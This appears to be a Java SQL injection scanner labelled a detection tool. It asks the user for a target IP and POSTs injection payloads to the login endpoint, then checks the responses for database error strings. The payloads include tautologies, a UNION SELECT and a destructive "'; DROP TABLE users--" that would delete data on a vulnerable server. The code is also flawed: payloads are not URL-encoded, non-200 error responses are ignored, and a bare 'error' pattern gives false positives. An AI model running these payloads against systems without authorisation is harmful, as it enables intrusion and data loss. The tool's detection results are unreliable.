import java.io.*;
import java.net.*;
import java.util.regex.*;

public class ErrorBasedSQLInjectionDetection {

    // Function to check for Error-Based SQL Injection patterns in the response text
    public static boolean detectErrorSQLInjection(String responseText) {
        // Patterns indicating potential error messages related to SQL injection
        String[] patterns = {
            "error",               // Common word indicating an error message
            "syntax.*error",       // SQL syntax error message
            "unclosed.*quotation", // Unclosed quotation mark error
            "mysql.*error",        // MySQL specific errors
            "Warning.*mysql",      // MySQL warning message
            "Invalid.*query",      // Invalid query error message
            "unrecognized.*command", // Unrecognized SQL command error
            "ORA-00933",           // Oracle SQL error code for syntax issues
        };

        // Check if any of the patterns are found in the response
        for (String pattern : patterns) {
            if (Pattern.compile(pattern, Pattern.CASE_INSENSITIVE).matcher(responseText).find()) {
                return true;
            }
        }
        return false;
    }

    // Function to simulate an HTTP request to check for Error-Based SQL injection
    public static void checkErrorSQLInjection(String ipAddress) {
        System.out.println("Checking for potential Error-Based SQL Injection on " + ipAddress + "...");

        // Simulate a form submission with potential Error SQL injection payloads
        String[] payloads = {
            "' OR 1=1--",                 // Common injection pattern
            "' AND 1=1--",                // AND condition injection
            "' OR 'a'='a'--",             // Always true injection
            "'; DROP TABLE users--",     // Attempt to drop a table
            "' UNION SELECT null, null--",// UNION-based injection (to generate error)
            "'; SELECT * FROM users--",  // Select query that might cause errors
        };

        // Try submitting the payloads to a hypothetical login page or endpoint
        String url = "http://" + ipAddress + "/login";  // Example URL; adjust based on the target application

        for (String payload : payloads) {
            try {
                // Prepare HTTP request
                URL targetUrl = new URL(url);
                HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                
                // Form data to send
                String data = "username=" + payload + "&password=password";
                connection.getOutputStream().write(data.getBytes("UTF-8"));

                // Get the response code
                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // Read the response
                    BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    String inputLine;
                    StringBuilder response = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();

                    // Check the response for signs of Error-Based SQL Injection vulnerability
                    if (detectErrorSQLInjection(response.toString())) {
                        System.out.println("[!] Potential Error-Based SQL Injection detected with payload: " + payload);
                        System.out.println("Response from server: " + response.toString().substring(0, Math.min(200, response.length())));  // Display part of the response
                    }
                } else {
                    System.out.println("[+] Request failed with status code: " + responseCode);
                }
            } catch (IOException e) {
                System.out.println("[!] Error making request: " + e.getMessage());
            }
        }
    }

    // Main function
    public static void main(String[] args) {
        System.out.println("==================== Error-Based SQL Injection Detection Tool ====================");

        // Prompt the user for an IP address to test for SQL Injection
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        try {
            System.out.print("Enter the target IP address:");
            String ipAddress = reader.readLine();

            // Start detecting Error SQL Injection attempts
            checkErrorSQLInjection(ipAddress);
        } catch (IOException e) {
            System.out.println("[!] Error reading input: " + e.getMessage());
        }
    }
}
